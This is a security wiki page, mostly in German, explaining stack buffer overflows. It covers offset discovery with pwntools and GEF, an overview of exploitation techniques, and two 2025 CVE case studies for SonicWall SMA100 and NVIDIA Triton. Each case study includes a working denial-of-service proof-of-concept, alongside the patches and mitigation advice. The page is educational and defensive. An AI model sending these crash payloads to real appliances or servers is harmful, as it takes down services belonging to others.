# Stack Overflow

{{#include ../../banners/hacktricks-training.md}}

## Was ist ein Stack Overflow

A **stack overflow** is a vulnerability that occurs when a program writes more data to the stack than it is allocated to hold. This excess data will **benachbarten Speicherbereich überschreiben**, leading to the corruption of valid data, control flow disruption, and potentially the execution of malicious code. This issue often arises due to the use of unsafe functions that do not perform bounds checking on input.

The main problem of this overwrite is that the **gespeicherter Befehlszeiger (EIP/RIP)** and the **gespeicherter Basiszeiger (EBP/RBP)** to return to the previous function are **auf dem Stack gespeichert**. Therefore, an attacker will be able to overwrite those and **den Ausführungsfluss des Programms kontrollieren**.

The vulnerability usually arises because a function **mehr Bytes in den Stack kopiert, als dafür zugewiesen wurden**, therefore being able to overwrite other parts of the stack.

Some common functions vulnerable to this are: **`strcpy`, `strcat`, `sprintf`, `gets`**... Also, functions like **`fgets`** , **`read` & `memcpy`** that take a **Längenargument**, might be used in a vulnerable way if the specified length is greater than the allocated one.

For example, the following functions could be vulnerable:
```c
void vulnerable() {
char buffer[128];
printf("Enter some text: ");
gets(buffer); // This is where the vulnerability lies
printf("You entered: %s\n", buffer);
}
```
### Finden von Stack Overflows Offsets

Die gebräuchlichste Methode, Stack Overflows zu finden, besteht darin, eine sehr große Eingabe aus `A`s zu geben (z. B. `python3 -c 'print("A"*1000)'`) und ein `Segmentation Fault` zu erwarten, der darauf hinweist, dass **versucht wurde, auf die Adresse `0x41414141` zuzugreifen**.

Außerdem, sobald du festgestellt hast, dass eine Stack Overflow vulnerability existiert, musst du den Offset finden, bis zu dem es möglich ist, die **return address zu überschreiben**. Dafür wird üblicherweise eine **De Bruijn sequence** verwendet. Für ein Alphabet der Größe _k_ und Teilsequenzen der Länge _n_ ist das eine **zyklische Sequenz, in der jede mögliche Teilsequenz der Länge _n_ genau einmal** als zusammenhängende Teilsequenz vorkommt.

Auf diese Weise, anstatt manuell den Offset zu ermitteln, der benötigt wird, um die EIP zu kontrollieren, kannst du eine dieser Sequenzen als Padding verwenden und dann den Offset der Bytes finden, die es letztlich überschrieben haben.

Es ist möglich, dafür **pwntools** zu verwenden:
```python
from pwn import *

# Generate a De Bruijn sequence of length 1000 with an alphabet size of 256 (byte values)
pattern = cyclic(1000)

# This is an example value that you'd have found in the EIP/IP register upon crash
eip_value = p32(0x6161616c)
offset = cyclic_find(eip_value)  # Finds the offset of the sequence in the De Bruijn pattern
print(f"The offset is: {offset}")
```
oder **GEF**:
```bash
#Patterns
pattern create 200 #Generate length 200 pattern
pattern search "avaaawaa" #Search for the offset of that substring
pattern search $rsp #Search the offset given the content of $rsp
```
## Exploiting Stack Overflows

Während eines overflows (vorausgesetzt die Größe des overflows ist groß genug) wirst du in der Lage sein, Werte lokaler Variablen auf dem Stack **overwrite** bis zum gespeicherten **EBP/RBP and EIP/RIP (or even more)** zu überschreiben.\
Die gebräuchlichste Methode, diesen Typ von Schwachstelle zu missbrauchen, ist das **modifying the return address**, sodass beim Ende der Funktion der **control flow will be redirected wherever the user specified** in diesem Pointer.

Allerdings kann in anderen Szenarien schon das **overwriting some variables values in the stack** ausreichen, um eine exploitation durchzuführen (z.B. in einfachen CTF challenges).

### Ret2win

In dieser Art von CTF challenges gibt es eine **function** **inside** der binary, die **never called** wird und die **you need to call in order to win**. Für diese Challenges musst du nur den **offset to overwrite the return address** finden und die **find the address of the function** zum Aufrufen bestimmen (gewöhnlich ist [**ASLR**](../common-binary-protections-and-bypasses/aslr/index.html) deaktiviert), sodass beim Rückkehr der vulnerable function die versteckte Funktion aufgerufen wird:


{{#ref}}
ret2win/
{{#endref}}

### Stack Shellcode

In diesem Szenario kann der attacker einen shellcode auf dem stack platzieren und den kontrollierten EIP/RIP missbrauchen, um zum shellcode zu springen und execute arbitrary code auszuführen:


{{#ref}}
stack-shellcode/
{{#endref}}

### Windows SEH-based exploitation (nSEH/SEH)

Auf 32-bit Windows kann ein overflow die Structured Exception Handler (SEH) chain überschreiben statt der gespeicherten return address. Bei exploitation wird typischerweise der SEH pointer durch einen POP POP RET gadget ersetzt und das 4-byte nSEH Feld für einen short jump verwendet, um zurück in den großen buffer zu pivoten, in dem der shellcode liegt. Ein übliches Muster ist ein short jmp in nSEH, das auf einen 5-byte near jmp landet, der direkt vor nSEH platziert ist, um Hunderte von Bytes zurück zum payload-Start zu springen.


{{#ref}}
windows-seh-overflow.md
{{#endref}}

### ROP & Ret2... techniques

Diese Technik ist das grundlegende Framework, um den wichtigsten Schutz der vorherigen Technik zu umgehen: **No executable stack (NX)**. Außerdem ermöglicht sie das Ausführen mehrerer anderer Techniken (ret2lib, ret2syscall...), die schließlich durch das Missbrauchen vorhandener Instruktionen in der binary arbitrary commands ausführen:


{{#ref}}
../rop-return-oriented-programing/
{{#endref}}

## Heap Overflows

Ein overflow befindet sich nicht immer auf dem stack; er kann zum Beispiel auch im **heap** auftreten:


{{#ref}}
../libc-heap/heap-overflow.md
{{#endref}}

## Types of protections

Es gibt mehrere protections, die versuchen, die exploitation von vulnerabilities zu verhindern — siehe:


{{#ref}}
../common-binary-protections-and-bypasses/
{{#endref}}

### Real-World Example: CVE-2025-40596 (SonicWall SMA100)

Ein gutes Beispiel dafür, warum **`sscanf` should never be trusted for parsing untrusted input** ist, trat 2025 in SonicWall’s SMA100 SSL-VPN appliance auf. Die verwundbare Routine in `/usr/src/EasyAccess/bin/httpd` versucht, die Version und den endpoint aus jeder URI zu extrahieren, die mit `/__api__/` beginnt:
```c
char version[3];
char endpoint[0x800] = {0};
/* simplified proto-type */
sscanf(uri, "%*[^/]/%2s/%s", version, endpoint);
```
1. Die erste Formatangabe (`%2s`) speichert sicher **zwei** Bytes in `version` (z. B. `"v1"`).
2. Die zweite Formatangabe (`%s`) **hat keinen Längenbegrenzer**, daher wird `sscanf` weiter kopieren **bis zum ersten NUL byte**.
3. Da `endpoint` auf dem **stack** liegt und **0x800 bytes long** ist, führt das Bereitstellen eines Pfads, der länger als 0x800 bytes ist, zur Korruption aller Daten, die nach dem Buffer liegen ‑ einschließlich des **stack canary** und der **saved return address**.

Eine einzeilige Proof-of-Concept ist ausreichend, um den Crash **vor der Authentifizierung** auszulösen:
```python
import requests, warnings
warnings.filterwarnings('ignore')
url = "https://TARGET/__api__/v1/" + "A"*3000
requests.get(url, verify=False)
```
Auch wenn stack canaries den Prozess abbrechen, erlangt ein Angreifer trotzdem ein **Denial-of-Service**-Primitive (und bei zusätzlichen information leaks möglicherweise code-execution). Die Lektion ist einfach:

* Geben Sie immer eine **maximale Feldbreite** an (z. B. `%511s`).
* Bevorzugen Sie sicherere Alternativen wie `snprintf`/`strncpy_s`.

### Reales Beispiel: CVE-2025-23310 & CVE-2025-23311 (NVIDIA Triton Inference Server)

NVIDIA’s Triton Inference Server (≤ v25.06) enthielt mehrere **stack-based overflows**, die über seine HTTP API erreichbar waren.
Das verwundbare Muster erschien wiederholt in `http_server.cc` und `sagemaker_server.cc`:
```c
int n = evbuffer_peek(req->buffer_in, -1, NULL, NULL, 0);
if (n > 0) {
/* allocates 16 * n bytes on the stack */
struct evbuffer_iovec *v = (struct evbuffer_iovec *)
alloca(sizeof(struct evbuffer_iovec) * n);
...
}
```
1. `evbuffer_peek` (libevent) gibt die **Anzahl der internen Buffer-Segmente** zurück, die den aktuellen HTTP-Request-Body bilden.
2. Jedes Segment führt dazu, dass ein **16-byte** `evbuffer_iovec` via `alloca()` auf dem **stack** alloziert wird – **ohne obere Grenze**.
3. Durch Missbrauch von **HTTP _chunked transfer-encoding_** kann ein Client die Anfrage in **hunderttausende von 6-byte chunks** (`"1\r\nA\r\n"`) aufteilen. Dadurch wächst `n` unbegrenzt, bis der stack erschöpft ist.

#### Proof-of-Concept (DoS)
```python
#!/usr/bin/env python3
import socket, sys

def exploit(host="localhost", port=8000, chunks=523_800):
s = socket.create_connection((host, port))
s.sendall((
f"POST /v2/models/add_sub/infer HTTP/1.1\r\n"
f"Host: {host}:{port}\r\n"
"Content-Type: application/octet-stream\r\n"
"Inference-Header-Content-Length: 0\r\n"
"Transfer-Encoding: chunked\r\n"
"Connection: close\r\n\r\n"
).encode())

for _ in range(chunks):                  # 6-byte chunk ➜ 16-byte alloc
s.send(b"1\r\nA\r\n")            # amplification factor ≈ 2.6x
s.sendall(b"0\r\n\r\n")               # end of chunks
s.close()

if __name__ == "__main__":
exploit(*sys.argv[1:])
```
Eine ~3 MB-Anfrage reicht aus, um die gespeicherte Rücksprungadresse zu überschreiben und den daemon zu **crashen**.

#### Patch & Gegenmaßnahmen
Die Version 25.07 ersetzt die unsichere Stack-Allokation durch einen **heap-gestützten `std::vector`** und behandelt `std::bad_alloc` elegant:
```c++
std::vector<evbuffer_iovec> v_vec;
try {
v_vec = std::vector<evbuffer_iovec>(n);
} catch (const std::bad_alloc &e) {
return TRITONSERVER_ErrorNew(TRITONSERVER_ERROR_INVALID_ARG, "alloc failed");
}
struct evbuffer_iovec *v = v_vec.data();
```
Erkenntnisse:
* Rufe `alloca()` niemals mit attacker-controlled sizes auf.
* Chunked requests können die Form von server-side buffers drastisch verändern.
* Validieren / begrenzen Sie jeden Wert, der aus client input abgeleitet wurde, *bevor* Sie ihn in memory allocations verwenden.

## Referenzen
* [watchTowr Labs – Stack Overflows, Heap Overflows and Existential Dread (SonicWall SMA100)](https://labs.watchtowr.com/stack-overflows-heap-overflows-and-existential-dread-sonicwall-sma100-cve-2025-40596-cve-2025-40597-and-cve-2025-40598/)
* [Trail of Bits – Uncovering memory corruption in NVIDIA Triton](https://blog.trailofbits.com/2025/08/04/uncovering-memory-corruption-in-nvidia-triton-as-a-new-hire/)
* [HTB: Rainbow – SEH overflow to RCE over HTTP (0xdf)](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)

{{#include ../../banners/hacktricks-training.md}}
